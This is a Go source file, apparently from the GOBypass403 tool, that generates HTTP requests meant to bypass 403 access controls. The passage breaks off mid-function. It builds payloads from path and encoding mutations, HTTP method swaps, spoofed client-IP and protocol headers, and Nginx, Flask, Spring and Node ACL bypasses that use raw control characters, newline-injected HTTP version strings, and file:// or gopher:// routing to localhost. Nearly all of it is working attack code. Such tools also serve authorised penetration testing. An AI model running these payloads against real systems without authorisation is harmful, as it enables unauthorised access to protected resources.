/*
GOBypass403
Author: slicingmelon <github.com/slicingmelon>
X: x.com/pedro_infosec
*/
package payload

import (
	"fmt"
	"net/url"
	"strings"

	"github.com/slicingmelon/go-rawurlparser"
	"github.com/slicingmelon/gobypass403/core/engine/recon"
	GB403Logger "github.com/slicingmelon/gobypass403/core/utils/logger"
)

// BypassModuleRegistry contains all available bypass modules
// This is used for debug token indexing and is independent of which modules are enabled for a scan
var BypassModulesRegistry = []string{
	"dumb_check",
	"mid_paths",
	"end_paths",
	"http_methods",
	"case_substitution",
	"char_encode",
	"nginx_bypasses",
	"http_headers_scheme",
	"http_headers_ip",
	"http_headers_port",
	"http_headers_url",
	"http_host",
	"unicode_path_normalization",
}

type PayloadGenerator struct {
	targetURL    string
	bypassModule string
	reconCache   *recon.ReconCache
	spoofHeader  string
	spoofIP      string
}

type PayloadGeneratorOptions struct {
	TargetURL    string
	BypassModule string
	ReconCache   *recon.ReconCache
	SpoofHeader  string
	SpoofIP      string
}

func NewPayloadGenerator(opts PayloadGeneratorOptions) *PayloadGenerator {
	return &PayloadGenerator{
		targetURL:    opts.TargetURL,
		bypassModule: opts.BypassModule,
		reconCache:   opts.ReconCache,
		spoofHeader:  opts.SpoofHeader,
		spoofIP:      opts.SpoofIP,
	}
}

func (pg *PayloadGenerator) Generate() []BypassPayload {
	switch pg.bypassModule {
	case "dumb_check":
		return pg.GenerateDumbCheckPayload(pg.targetURL, pg.bypassModule)
	case "mid_paths":
		return pg.GenerateMidPathsPayloads(pg.targetURL, pg.bypassModule)
	case "end_paths":
		return pg.GenerateEndPathsPayloads(pg.targetURL, pg.bypassModule)
	case "case_substitution":
		return pg.GenerateCaseSubstitutionPayloads(pg.targetURL, pg.bypassModule)
	case "http_methods":
		return pg.GenerateHTTPMethodsPayloads(pg.targetURL, pg.bypassModule)
	case "nginx_bypasses":
		return pg.GenerateNginxACLsBypassPayloads(pg.targetURL, pg.bypassModule)
	case "char_encode":
		return pg.GenerateCharEncodePayloads(pg.targetURL, pg.bypassModule)
	case "http_headers_scheme":
		return pg.GenerateHeaderSchemePayloads(pg.targetURL, pg.bypassModule)
	case "http_headers_ip":
		return pg.GenerateHeaderIPPayloads(pg.targetURL, pg.bypassModule)
	case "http_headers_port":
		return pg.GenerateHeaderPortPayloads(pg.targetURL, pg.bypassModule)
	case "http_headers_url":
		return pg.GenerateHeaderURLPayloads(pg.targetURL, pg.bypassModule)
	case "http_host":
		return pg.GenerateHostHeaderPayloads(pg.targetURL, pg.bypassModule)
	case "unicode_path_normalization":
		return pg.GenerateUnicodePathNormalizationsPayloads(pg.targetURL, pg.bypassModule)
	default:
		//GB403Logger.Warning().Msgf("Unknown bypass module: %s\n", pg.bypassModule)
		return []BypassPayload{}
	}
}

type Headers struct {
	Header string
	Value  string
}

type BypassPayload struct {
	OriginalURL  string    // store it as we might need it
	Scheme       string    // this gets updated
	Method       string    // this gets updated
	Host         string    // this gets updated
	RawURI       string    // this gets updated, represents everything that goes into the first line of the request u
	Headers      []Headers // all headers as result of various payload generators
	Body         string    // this gets updated, represents everything that goes into the body of the request
	BypassModule string    // always gets updated
	PayloadToken string    // always gets updated
}

func (pg *PayloadGenerator) GenerateDumbCheckPayload(targetURL string, bypassModule string) []BypassPayload {
	var allJobs []BypassPayload

	parsedURL, err := rawurlparser.RawURLParse(targetURL)
	if err != nil {
		GB403Logger.Error().Msgf("Failed to parse URL")
		return allJobs
	}

	// Extract path and query
	rawURI := parsedURL.Path
	if parsedURL.Query != "" {
		rawURI += "?" + parsedURL.Query
	}

	// Just one job with the original URL
	job := BypassPayload{
		OriginalURL:  targetURL,
		Method:       "GET",
		Scheme:       parsedURL.Scheme,
		Host:         parsedURL.Host,
		RawURI:       rawURI,
		BypassModule: bypassModule,
	}

	// Generate token with only the necessary components
	job.PayloadToken = GeneratePayloadToken(job)

	allJobs = append(allJobs, job)

	GB403Logger.Debug().BypassModule(bypassModule).Msgf("Generated 1 payload for %s\n", targetURL)
	return allJobs
}

func (pg *PayloadGenerator) GenerateMidPathsPayloads(targetURL string, bypassModule string) []BypassPayload {
	var jobs []BypassPayload
	parsedURL, err := rawurlparser.RawURLParse(targetURL)
	if err != nil {
		GB403Logger.Error().Msgf("Failed to parse URL")
		return jobs
	}

	payloads, err := ReadPayloadsFromFile("internal_midpaths.lst")
	if err != nil {
		GB403Logger.Error().Msgf("Failed to read midpaths payloads: %v\n", err)
		return jobs
	}

	path := parsedURL.Path
	if path == "" {
		path = "/"
	}

	// Extract query string if it exists
	query := ""
	if parsedURL.Query != "" {
		query = "?" + parsedURL.Query
	}

	slashCount := strings.Count(path, "/")
	if slashCount == 0 {
		slashCount = 1
	}

	// map[rawURI]struct{} - we only need unique RawURIs
	uniquePaths := make(map[string]struct{})

	for idxSlash := 0; idxSlash < slashCount; idxSlash++ {
		for _, payload := range payloads {
			// Post-slash variants (always)
			pathPost := ReplaceNth(path, "/", "/"+payload, idxSlash+1)
			if pathPost != path { // Only add if replacement was successful
				uniquePaths[pathPost+query] = struct{}{}
				uniquePaths["/"+pathPost+query] = struct{}{}
			}

			// Pre-slash variants only if idxSlash > 1
			if idxSlash > 1 {
				pathPre := ReplaceNth(path, "/", payload+"/", idxSlash+1)
				if pathPre != path { // Only add if replacement was successful
					uniquePaths[pathPre+query] = struct{}{}
					uniquePaths["/"+pathPre+query] = struct{}{}
				}
			}
		}
	}

	// Convert unique paths to PayloadJobs
	for rawURI := range uniquePaths {
		job := BypassPayload{
			OriginalURL:  targetURL,
			Method:       "GET",
			Scheme:       parsedURL.Scheme,
			Host:         parsedURL.Host,
			RawURI:       rawURI,
			BypassModule: bypassModule,
		}

		// Generate token with only the necessary components
		job.PayloadToken = GeneratePayloadToken(job)

		jobs = append(jobs, job)
	}

	GB403Logger.Debug().BypassModule(bypassModule).Msgf("Generated %d payloads for %s\n", len(jobs), targetURL)
	return jobs
}

func (pg *PayloadGenerator) GenerateEndPathsPayloads(targetURL string, bypassModule string) []BypassPayload {
	var jobs []BypassPayload

	parsedURL, err := rawurlparser.RawURLParse(targetURL)
	if err != nil {
		GB403Logger.Error().Msgf("Failed to parse URL")
		return jobs
	}

	payloads, err := ReadPayloadsFromFile("internal_endpaths.lst")
	if err != nil {
		GB403Logger.Error().Msgf("Failed to read endpaths payloads: %v\n", err)
		return jobs
	}

	basePath := parsedURL.Path
	separator := ""
	if basePath != "/" && !strings.HasSuffix(basePath, "/") {
		separator = "/"
	}

	// Extract query string if it exists
	query := ""
	if parsedURL.Query != "" {
		query = "?" + parsedURL.Query
	}

	// map[rawURI]struct{} - we only need unique RawURIs
	uniquePaths := make(map[string]struct{})

	for _, payload := range payloads {
		// First variant - 'url/suffix'
		rawURI := basePath + separator + payload + query
		uniquePaths[rawURI] = struct{}{}

		// Second variant - 'url/suffix/'
		rawURIWithSlash := basePath + separator + payload + "/" + query
		uniquePaths[rawURIWithSlash] = struct{}{}

		// Only if basePath is not "/" and payload doesn't start with a letter
		if basePath != "/" {
			if !isLetter(payload[0]) {
				// Third variant - Add 'suffix'
				rawURISuffix := basePath + payload + query
				uniquePaths[rawURISuffix] = struct{}{}

				// Fourth variant - Add 'suffix/'
				rawURISuffixSlash := basePath + payload + "/" + query
				uniquePaths[rawURISuffixSlash] = struct{}{}
			}
		}
	}

	// Convert unique paths to PayloadJobs
	for rawURI := range uniquePaths {
		job := BypassPayload{
			OriginalURL:  targetURL,
			Method:       "GET",
			Scheme:       parsedURL.Scheme,
			Host:         parsedURL.Host,
			RawURI:       rawURI,
			BypassModule: bypassModule,
		}

		job.PayloadToken = GeneratePayloadToken(job)

		jobs = append(jobs, job)
	}

	GB403Logger.Debug().BypassModule(bypassModule).Msgf("Generated %d payloads for %s\n", len(jobs), targetURL)
	return jobs
}

func (pg *PayloadGenerator) GenerateHeaderIPPayloads(targetURL string, bypassModule string) []BypassPayload {
	var allJobs []BypassPayload

	parsedURL, err := rawurlparser.RawURLParse(targetURL)
	if err != nil {
		GB403Logger.Error().Msgf("Failed to parse URL")
		return allJobs
	}

	headerNames, err := ReadPayloadsFromFile("header_ip_hosts.lst")
	if err != nil {
		GB403Logger.Error().Msgf("Failed to read header names: %v", err)
		return allJobs
	}

	// Add custom headers (cli -spoof-header)
	if pg.spoofHeader != "" {
		customHeaders := strings.Split(pg.spoofHeader, ",")
		for _, header := range customHeaders {
			header = strings.TrimSpace(header)
			if header != "" {
				headerNames = append(headerNames, header)
			}
		}
		GB403Logger.Verbose().BypassModule(bypassModule).Msgf("Added [%s] custom headers from -spoof-header\n", strings.Join(customHeaders, ","))
	}

	ips, err := ReadPayloadsFromFile("internal_ip_hosts.lst")
	if err != nil {
		GB403Logger.Error().Msgf("Failed to read IPs: %v", err)
		return allJobs
	}

	// Add custom spoof IPs
	if pg.spoofIP != "" {
		customIPs := strings.Split(pg.spoofIP, ",")
		for _, ip := range customIPs {
			ip = strings.TrimSpace(ip)
			if ip != "" {
				ips = append(ips, ip)
			}
		}
		GB403Logger.Verbose().BypassModule(bypassModule).Msgf("Added [%s] custom IPs from -spoof-ip\n", strings.Join(customIPs, ","))
	}

	// Extract path and query
	rawURI := parsedURL.Path
	if parsedURL.Query != "" {
		rawURI += "?" + parsedURL.Query
	}

	// Base job template
	baseJob := BypassPayload{
		OriginalURL:  targetURL,
		Method:       "GET",
		Scheme:       parsedURL.Scheme,
		Host:         parsedURL.Host,
		RawURI:       rawURI,
		BypassModule: bypassModule,
	}

	// Special case job
	specialJob := baseJob
	specialJob.Headers = []Headers{{
		Header: "X-AppEngine-Trusted-IP-Request",
		Value:  "1",
	}}
	specialJob.PayloadToken = GeneratePayloadToken(specialJob)
	allJobs = append(allJobs, specialJob)

	// Generate regular jobs
	for _, headerName := range headerNames {
		for _, ip := range ips {
			if headerName == "Forwarded" {
				variations := []string{
					fmt.Sprintf("by=%s", ip),
					fmt.Sprintf("for=%s", ip),
					fmt.Sprintf("host=%s", ip),
				}

				for _, variation := range variations {
					job := baseJob
					job.Headers = []Headers{{
						Header: headerName,
						Value:  variation,
					}}
					job.PayloadToken = GeneratePayloadToken(job)
					allJobs = append(allJobs, job)
				}
			} else {
				job := baseJob
				job.Headers = []Headers{{
					Header: headerName,
					Value:  ip,
				}}
				job.PayloadToken = GeneratePayloadToken(job)
				allJobs = append(allJobs, job)
			}
		}
	}

	GB403Logger.Debug().Msgf("[%s] Generated %d payloads for %s\n", bypassModule, len(allJobs), targetURL)
	return allJobs
}

func (pg *PayloadGenerator) GenerateHTTPMethodsPayloads(targetURL string, bypassModule string) []BypassPayload {
	var allJobs []BypassPayload

	parsedURL, err := rawurlparser.RawURLParse(targetURL)
	if err != nil {
		GB403Logger.Error().Msgf("Failed to parse URL")
		return allJobs
	}

	httpMethods, err := ReadPayloadsFromFile("internal_http_methods.lst")
	if err != nil {
		GB403Logger.Error().Msgf("Failed to read HTTP methods: %v", err)
		return allJobs
	}

	// Extract path and query
	path := parsedURL.Path
	query := ""
	if parsedURL.Query != "" {
		query = "?" + parsedURL.Query
	}

	// Base job template
	baseJob := BypassPayload{
		OriginalURL:  targetURL,
		Scheme:       parsedURL.Scheme,
		Host:         parsedURL.Host,
		BypassModule: bypassModule,
	}

	// Methods that require Content-Length header
	requiresContentLength := map[string]struct{}{
		"POST":      {},
		"PUT":       {},
		"PATCH":     {},
		"PROPFIND":  {},
		"PROPPATCH": {},
		"MKCOL":     {},
		"LOCK":      {},
		"UNLOCK":    {},
		"DELETE":    {},
	}

	for _, method := range httpMethods {
		// Skip empty methods
		if method == "" {
			continue
		}

		// Basic case: method with original path+query
		job := baseJob
		job.Method = method
		job.RawURI = path + query

		// Add Content-Length header if needed
		if _, needsContentLength := requiresContentLength[method]; needsContentLength {
			job.Headers = append(job.Headers, Headers{
				Header: "Content-Length",
				Value:  "0",
			})

			// For POST requests, create an additional variant with query in body
			if method == "POST" && parsedURL.Query != "" {
				// Create a job with path only (no query) for POST
				postJob := baseJob
				postJob.Method = method
				postJob.RawURI = path // No query in URL

				// Set query as body data without the leading "?"
				bodyData := parsedURL.Query

				// Add proper headers for form data
				postJob.Headers = append(postJob.Headers, Headers{
					Header: "Content-Type",
					Value:  "application/x-www-form-urlencoded",
				})
				postJob.Headers = append(postJob.Headers, Headers{
					Header: "Content-Length",
					Value:  fmt.Sprintf("%d", len(bodyData)),
				})

				// Add the body data
				postJob.Body = bodyData

				postJob.PayloadToken = GeneratePayloadToken(postJob)
				allJobs = append(allJobs, postJob)
			}
		}

		// Generate token and add job (fixed from postJob to job)
		job.PayloadToken = GeneratePayloadToken(job)
		allJobs = append(allJobs, job)
	}

	GB403Logger.Debug().BypassModule(bypassModule).Msgf("Generated %d payloads for %s\n", len(allJobs), targetURL)
	return allJobs
}

func (pg *PayloadGenerator) GenerateCaseSubstitutionPayloads(targetURL string, bypassModule string) []BypassPayload {
	var allJobs []BypassPayload

	parsedURL, err := rawurlparser.RawURLParse(targetURL)
	if err != nil {
		GB403Logger.Error().Msgf("Failed to parse URL")
		return allJobs
	}

	basePath := parsedURL.Path

	// Extract query string if it exists
	query := ""
	if parsedURL.Query != "" {
		query = "?" + parsedURL.Query
	}

	// map[rawURI]struct{} - we only need unique RawURIs
	uniquePaths := make(map[string]struct{})

	// Base job template
	baseJob := BypassPayload{
		OriginalURL:  targetURL,
		Method:       "GET",
		Scheme:       parsedURL.Scheme,
		Host:         parsedURL.Host,
		BypassModule: bypassModule,
	}

	// 1. CAIDO TECHNIQUE: Last letter uppercase
	if len(basePath) > 0 {
		lastCharIndex := len(basePath) - 1
		lastChar := basePath[lastCharIndex]

		if isLetter(byte(lastChar)) && lastChar >= 'a' && lastChar <= 'z' {
			// Create version with just the last letter uppercase
			lastLetterUppercase := basePath[:lastCharIndex] + strings.ToUpper(string(lastChar))
			uniquePaths[lastLetterUppercase+query] = struct{}{}
		}
	}

	// 2. First line (method) uppercase
	// Create a variant with uppercase method
	methodUpperJob := baseJob
	methodUpperJob.Method = strings.ToUpper(methodUpperJob.Method) // Already uppercase for GET but handles other methods
	methodUpperJob.RawURI = basePath + query
	methodUpperJob.PayloadToken = GeneratePayloadToken(methodUpperJob)
	allJobs = append(allJobs, methodUpperJob)

	// 3. Find and invert case for all letter positions
	for i, char := range basePath {
		if isLetter(byte(char)) {
			// Create case-inverted version
			newPath := basePath[:i]
			if char >= 'a' && char <= 'z' {
				newPath += strings.ToUpper(string(char))
			} else {
				newPath += strings.ToLower(string(char))
			}
			newPath += basePath[i+1:]

			// Add query to the case-modified path
			uniquePaths[newPath+query] = struct{}{}
		}
	}

	// Convert unique paths to PayloadJobs
	for rawURI := range uniquePaths {
		job := baseJob
		job.RawURI = rawURI
		job.PayloadToken = GeneratePayloadToken(job)
		allJobs = append(allJobs, job)
	}

	// 4. Full uppercase path (this is more comprehensive than Caido's approach)
	fullUpperPath := strings.ToUpper(basePath)
	if fullUpperPath != basePath { // Only if there's something to change
		job := baseJob
		job.RawURI = fullUpperPath + query
		job.PayloadToken = GeneratePayloadToken(job)
		allJobs = append(allJobs, job)
	}

	GB403Logger.Debug().BypassModule(bypassModule).Msgf("Generated %d payloads for %s\n", len(allJobs), targetURL)
	return allJobs
}

func (pg *PayloadGenerator) GenerateCharEncodePayloads(targetURL string, bypassModule string) []BypassPayload {
	var allJobs []BypassPayload

	parsedURL, err := rawurlparser.RawURLParse(targetURL)
	if err != nil {
		GB403Logger.Error().Msgf("Failed to parse URL")
		return allJobs
	}

	basePath := parsedURL.Path

	// Extract query string if it exists
	query := ""
	if parsedURL.Query != "" {
		query = "?" + parsedURL.Query
	}

	// Create separate maps for different encoding levels
	singlePaths := make(map[string]struct{})
	doublePaths := make(map[string]struct{})
	triplePaths := make(map[string]struct{})

	// Base job template
	baseJob := BypassPayload{
		OriginalURL:  targetURL,
		Method:       "GET",
		Scheme:       parsedURL.Scheme,
		Host:         parsedURL.Host,
		BypassModule: bypassModule,
	}

	// 1. First process the last character of the path
	if len(basePath) > 0 {
		lastCharIndex := len(basePath) - 1
		lastChar := basePath[lastCharIndex]

		// Only encode if it's a letter
		if isLetter(lastChar) {
			// Single URL encoding for last character
			encoded := fmt.Sprintf("%%%02x", lastChar)
			singleEncoded := basePath[:lastCharIndex] + encoded
			singlePaths[singleEncoded+query] = struct{}{}

			// Double URL encoding for last character
			doubleEncoded := basePath[:lastCharIndex] + "%25" + encoded[1:]
			doublePaths[doubleEncoded+query] = struct{}{}

			// Triple URL encoding for last character
			tripleEncoded := basePath[:lastCharIndex] + "%2525" + encoded[1:]
			triplePaths[tripleEncoded+query] = struct{}{}
		}
	}

	// 2. Process the first character of the path
	if len(basePath) > 0 && basePath != "/" {
		firstCharIndex := 0
		// Skip leading slash if present
		if basePath[0] == '/' && len(basePath) > 1 {
			firstCharIndex = 1
		}

		firstChar := basePath[firstCharIndex]

		// Only encode if it's a letter
		if isLetter(firstChar) {
			// Single URL encoding for first character
			encoded := fmt.Sprintf("%%%02x", firstChar)
			singleEncoded := basePath[:firstCharIndex] + encoded + basePath[firstCharIndex+1:]
			singlePaths[singleEncoded+query] = struct{}{}

			// Double URL encoding for first character
			doubleEncoded := basePath[:firstCharIndex] + "%25" + encoded[1:] + basePath[firstCharIndex+1:]
			doublePaths[doubleEncoded+query] = struct{}{}

			// Triple URL encoding for first character
			tripleEncoded := basePath[:firstCharIndex] + "%2525" + encoded[1:] + basePath[firstCharIndex+1:]
			triplePaths[tripleEncoded+query] = struct{}{}
		}
	}

	// 3. Process the last path segment
	if len(basePath) > 0 {
		segments := strings.Split(basePath, "/")
		if len(segments) > 1 {
			lastSegment := segments[len(segments)-1]

			// Skip empty segments
			if lastSegment != "" {
				// Process last segment
				for i, char := range lastSegment {
					if isLetter(byte(char)) {
						// Build the path prefix (everything before the last segment)
						prefix := strings.Join(segments[:len(segments)-1], "/") + "/"

						// Single URL encoding
						encoded := fmt.Sprintf("%%%02x", char)
						singleEncoded := prefix + lastSegment[:i] + encoded + lastSegment[i+1:]
						singlePaths[singleEncoded+query] = struct{}{}

						// Double URL encoding
						doubleEncoded := prefix + lastSegment[:i] + "%25" + encoded[1:] + lastSegment[i+1:]
						doublePaths[doubleEncoded+query] = struct{}{}

						// Triple URL encoding
						tripleEncoded := prefix + lastSegment[:i] + "%2525" + encoded[1:] + lastSegment[i+1:]
						triplePaths[tripleEncoded+query] = struct{}{}
					}
				}
			}
		}
	}

	// 4. Find all letter positions in the entire path
	for i, char := range basePath {
		if isLetter(byte(char)) {
			// Single URL encoding
			encoded := fmt.Sprintf("%%%02x", char)
			singleEncoded := basePath[:i] + encoded + basePath[i+1:]
			singlePaths[singleEncoded+query] = struct{}{}

			// Double URL encoding
			doubleEncoded := basePath[:i] + "%25" + encoded[1:] + basePath[i+1:]
			doublePaths[doubleEncoded+query] = struct{}{}

			// Triple URL encoding
			tripleEncoded := basePath[:i] + "%2525" + encoded[1:] + basePath[i+1:]
			triplePaths[tripleEncoded+query] = struct{}{}
		}
	}

	// Helper function to create jobs
	createJobs := func(paths map[string]struct{}, moduleType string) {
		for rawURI := range paths {
			job := baseJob
			job.RawURI = rawURI
			job.BypassModule = moduleType
			job.PayloadToken = GeneratePayloadToken(job)
			allJobs = append(allJobs, job)
		}
	}

	// Create jobs for each encoding level
	createJobs(singlePaths, "char_encode")
	createJobs(doublePaths, "char_encode_double")
	createJobs(triplePaths, "char_encode_triple")

	totalJobs := len(singlePaths) + len(doublePaths) + len(triplePaths)
	GB403Logger.Debug().BypassModule(bypassModule).Msgf("Generated %d payloads for %s\n", totalJobs, targetURL)
	return allJobs
}

/*
GenerateNginxACLsBypassPayloads
*/
func (pg *PayloadGenerator) GenerateNginxACLsBypassPayloads(targetURL string, bypassModule string) []BypassPayload {
	var allJobs []BypassPayload

	parsedURL, err := rawurlparser.RawURLParse(targetURL)
	if err != nil {
		GB403Logger.Error().Msgf("Failed to parse URL")
		return allJobs
	}

	basePath := parsedURL.Path

	// Extract query string if it exists
	query := ""
	if parsedURL.Query != "" {
		query = "?" + parsedURL.Query
	}

	// Base job template
	baseJob := BypassPayload{
		OriginalURL:  targetURL,
		Method:       "GET",
		Scheme:       parsedURL.Scheme,
		Host:         parsedURL.Host,
		BypassModule: bypassModule,
	}

	// Define comprehensive bypass character sets
	// Raw bytes must be used directly in the string via byte conversion

	// Flask bypass characters
	flaskBypassBytes := []byte{
		0x85, // Next line character
		0xA0, // Non-breaking space
		0x1F, // Information separator one
		0x1E, // Information separator two
		0x1D, // Information separator three
		0x1C, // Information separator four
		0x0C, // Form feed
		0x0B, // Vertical tab
	}

	// Spring Boot bypass characters
	springBootBypassBytes := []byte{
		0x09, // Tab character
	}
	springBootStrings := []string{";"}

	// Node.js bypass characters
	nodejsBypassBytes := []byte{
		0xA0, // Non-breaking space
		0x09, // Tab character
		0x0C, // Form feed
	}

	// Combine all unique bypass characters
	rawBypassChars := make([]string, 0)
	encodedBypassChars := make([]string, 0)
	charMap := make(map[string]bool) // To track uniqueness

	// Process byte-based characters
	processBytes := func(bytes []byte) {
		for _, b := range bytes {
			// Raw character
			rawChar := string([]byte{b})
			if !charMap[rawChar] {
				rawBypassChars = append(rawBypassChars, rawChar)
				charMap[rawChar] = true
			}

			// URL-encoded version
			encodedChar := fmt.Sprintf("%%%02X", b)
			encodedBypassChars = append(encodedBypassChars, encodedChar)
		}
	}

	// Add all byte-based characters
	processBytes(flaskBypassBytes)
	processBytes(springBootBypassBytes)
	processBytes(nodejsBypassBytes)

	// Add string-based characters
	for _, s := range springBootStrings {
		if !charMap[s] {
			rawBypassChars = append(rawBypassChars, s)
			charMap[s] = true
		}
		// No need to URL-encode simple ASCII characters like semicolon
		encodedBypassChars = append(encodedBypassChars, url.QueryEscape(s))
	}

	// Add the %0A character (newline) since it can cut the path (Nginx rewrite)
	if !charMap["\n"] {
		rawBypassChars = append(rawBypassChars, "\n")
		charMap["\n"] = true
	}
	encodedBypassChars = append(encodedBypassChars, "%0A")

	// Split the path into segments to insert characters at various positions
	pathSegments := strings.Split(strings.TrimPrefix(basePath, "/"), "/")

	// Helper function to add a job with a specific URI
	addJob := func(uri string, headers ...Headers) {
		job := baseJob
		job.RawURI = uri
		if len(headers) > 0 {
			job.Headers = headers
		}
		job.PayloadToken = GeneratePayloadToken(job)
		allJobs = append(allJobs, job)
	}

	// 1. Generate payloads by appending characters to the end of the path
	for _, char := range rawBypassChars {
		addJob(basePath + char + query)
	}
	for _, encoded := range encodedBypassChars {
		addJob(basePath + encoded + query)
	}

	// 2. Try after a trailing slash if the path doesn't already end with one
	if !strings.HasSuffix(basePath, "/") {
		for _, char := range rawBypassChars {
			addJob(basePath + "/" + char + query)
		}
		for _, encoded := range encodedBypassChars {
			addJob(basePath + "/" + encoded + query)
		}
	}

	// 3. Insert characters at the beginning of the path
	for _, char := range rawBypassChars {
		addJob("/" + char + strings.TrimPrefix(basePath, "/") + query)
	}
	for _, encoded := range encodedBypassChars {
		addJob("/" + encoded + strings.TrimPrefix(basePath, "/") + query)
	}

	// 4. Insert characters between path segments
	if len(pathSegments) > 1 {
		for i := 0; i < len(pathSegments); i++ {
			prefix := "/" + strings.Join(pathSegments[:i], "/")
			if i > 0 {
				prefix += "/" // Add trailing slash for segments after first
			}

			suffix := ""
			if i < len(pathSegments) {
				suffix = "/" + strings.Join(pathSegments[i:], "/")
			}

			// Raw characters
			for _, char := range rawBypassChars {
				addJob(prefix + char + suffix + query)
			}
			// URL-encoded characters
			for _, encoded := range encodedBypassChars {
				addJob(prefix + encoded + suffix + query)
			}
		}
	}

	// 5. NEW: Insert characters after the first character of each path segment
	for i, segment := range pathSegments {
		if len(segment) >= 2 { // Must have at least 2 characters
			// Create path prefix (everything before current segment)
			prefix := "/"
			if i > 0 {
				prefix = "/" + strings.Join(pathSegments[:i], "/") + "/"
			}

			// Create path suffix (everything after current segment)
			suffix := ""
			if i < len(pathSegments)-1 {
				suffix = "/" + strings.Join(pathSegments[i+1:], "/")
			}

			// Insert characters after first character of segment
			firstChar := segment[0:1]
			restOfSegment := segment[1:]

			for _, char := range rawBypassChars {
				modifiedPath := prefix + firstChar + char + restOfSegment + suffix + query
				addJob(modifiedPath)
			}

			for _, encoded := range encodedBypassChars {
				modifiedPath := prefix + firstChar + encoded + restOfSegment + suffix + query
				addJob(modifiedPath)
			}
		}
	}

	// Newline for HTTP version technique
	newlineChar := string([]byte{0x0A})
	encodedNewline := "%0A"

	// HTTP version-like strings
	httpVersions := []string{
		"HTTP/1.1",
		"HTTP/1.0",
		"HTTP/2.0",
		"HTTP/0.9",
	}

	// 6. Generate whitespace+HTTP version payloads
	for _, httpVersion := range httpVersions {
		// Raw newline
		addJob(basePath + newlineChar + httpVersion + query)
		// URL-encoded newline
		addJob(basePath + encodedNewline + httpVersion + query)

		// Try at path segment positions
		if len(pathSegments) > 1 {
			for i := 0; i < len(pathSegments); i++ {
				prefix := "/" + strings.Join(pathSegments[:i], "/")
				if i > 0 {
					prefix += "/"
				}

				suffix := ""
				if i < len(pathSegments) {
					suffix = "/" + strings.Join(pathSegments[i:], "/")
				}

				// Raw newline
				addJob(prefix + newlineChar + httpVersion + suffix + query)
				// URL-encoded newline
				addJob(prefix + encodedNewline + httpVersion + suffix + query)
			}
		}
	}

	// Scheme techniques
	schemes := []string{
		"http://",
		"https://",
		"file://",
		"gopher://",
	}

	// Alternative hosts
	alternativeHosts := []string{
		"localhost",
		"127.0.0.1",
	}

	// Add port variants
	if parsedURL.Port != "" {
		alternativeHosts = append(alternativeHosts,
			"localhost:"+parsedURL.Port,
			"127.0.0.1:"+parsedURL.Port)
	} else {
		alternativeHosts = append(alternativeHosts,
			"localhost:80", "localhost:443",
			"127.0.0.1:80", "127.0.0.1:443")
	}

	// 7. Complex bypass patterns with host routing
	for _, httpVersion := range httpVersions {
		for _, scheme := range schemes {
			for _, altHost := range alternativeHosts {
				// Raw newlines
				uri := basePath + newlineChar + httpVersion + newlineChar + scheme + altHost + basePath + query

				// Basic variant
				addJob(uri)

				// With explicit Host header
				addJob(uri, Headers{
					Header: "Host",
					Value:  parsedURL.Host,
				})

				// With original host
				addJob(basePath + newlineChar + httpVersion + newlineChar + scheme + parsedURL.Host + basePath + query)

				// URL-encoded newlines
				encodedUri := basePath + encodedNewline + httpVersion + encodedNewline + scheme + altHost + basePath + query

				// Basic encoded variant
				addJob(encodedUri)

				// With explicit Host header
				addJob(encodedUri, Headers{
					Header: "Host",
					Value:  parsedURL.Host,
				})

				// Try at different path segments
				if len(pathSegments) > 1 {
					for i := 0; i < len(pathSegments); i++ {
						prefix := "/" + strings.Join(pathSegments[:i], "/")
						if i > 0 {
							prefix += "/"
						}

						suffix := ""
						if i < len(pathSegments) {
							suffix = "/" + strings.Join(pathSegments[i:], "/")
						}

						// Raw newlines with alternative host
						segmentUri := prefix + newlineChar + httpVersion + newlineChar + scheme + altHost + basePath + suffix + query
						addJob(segmentUri)

						// With explicit Host header
						addJob(segmentUri, Headers{
							Header: "Host",
							Value:  parsedURL.Host,
						})

						// URL-encoded newlines
						encodedSegmentUri := prefix + encodedNewline + httpVersion + encodedNewline + scheme + altHost + basePath + suffix + query
						addJob(encodedSegmentUri)

						// With explicit Host header
						addJob(encodedSegmentUri, Headers{
							Header: "Host",
							Value:  parsedURL.Host,
						})
					}
				}
			}
		}
	}

	GB403Logger.Debug().BypassModule(bypassModule).Msgf("Generated %d Nginx bypass payloads for %s\n", len(allJobs), targetURL)
	return allJobs
}

func (pg *PayloadGenerator) GenerateHeaderSchemePayloads(targetURL string, bypassModule string) []BypassPayload {
	var allJobs []BypassPayload

	parsedURL, err := rawurlparser.RawURLParse(targetURL)
	if err != nil {
		GB403Logger.Error().Msgf("Failed to parse URL")
		return allJobs
	}

	headerSchemes, err := ReadPayloadsFromFile("header_proto_schemes.lst")
	if err != nil {
		GB403Logger.Error().Msgf("Failed to read header schemes: %v", err)
		return allJobs
	}

	protoSchemes, err := ReadPayloadsFromFile("internal_proto_schemes.lst")
	if err != nil {
		GB403Logger.Error().Msgf("Failed to read proto schemes: %v", err)
		return allJobs
	}

	// Extract path and query
	rawURI := parsedURL.Path
	if parsedURL.Query != "" {
		rawURI += "?" + parsedURL.Query
	}

	// Base job template
	baseJob := BypassPayload{
		OriginalURL:  targetURL,
		Method:       "GET",
		Scheme:       parsedURL.Scheme,
		Host:         parsedURL.Host,
		RawURI:       rawURI,
		BypassModule: bypassModule,
	}

	// Handle special headers with "on" value
	specialHeaders := map[string]struct{}{
		"Front-End-Https":   {},
		"X-Forwarded-HTTPS": {},
		"X-Forwarded-SSL":   {},
	}

	for _, headerScheme := range headerSchemes {
		if _, isSpecial := specialHeaders[headerScheme]; isSpecial {
			job := baseJob
			job.Headers = []Headers{{
				Header: headerScheme,
				Value:  "on",
			}}
			job.PayloadToken = GeneratePayloadToken(job)
			allJobs = append(allJobs, job)
			continue
		}

		// Handle other headers
		for _, protoScheme := range protoSchemes {
			job := baseJob
			if headerScheme == "Forwarded" {
				job.Headers = []Headers{{
					Header: headerScheme,
					Value:  fmt.Sprintf("proto=%s", protoScheme),
				}}
			} else {
				job.Headers = []Headers{{
					Header: headerScheme,
					Value:  protoScheme,
				}}
			}

			job.PayloadToken = GeneratePayloadToken(job)
			allJobs = append(allJobs, job)
		}
	}

	GB403Logger.Debug().BypassModule(bypassModule).Msgf("Generated %d payloads for %s\n", len(allJobs), targetURL)
	return allJobs
}

func (pg *PayloadGenerator) GenerateHeaderURLPayloads(targetURL string, bypassModule string) []BypassPayload {
	var allJobs []BypassPayload

	parsedURL, err := rawurlparser.RawURLParse(targetURL)
	if err != nil {
		GB403Logger.Error().Msgf("Failed to parse URL")
		return allJobs
	}

	headerURLs, err := ReadPayloadsFromFile("header_urls.lst")
	if err != nil {
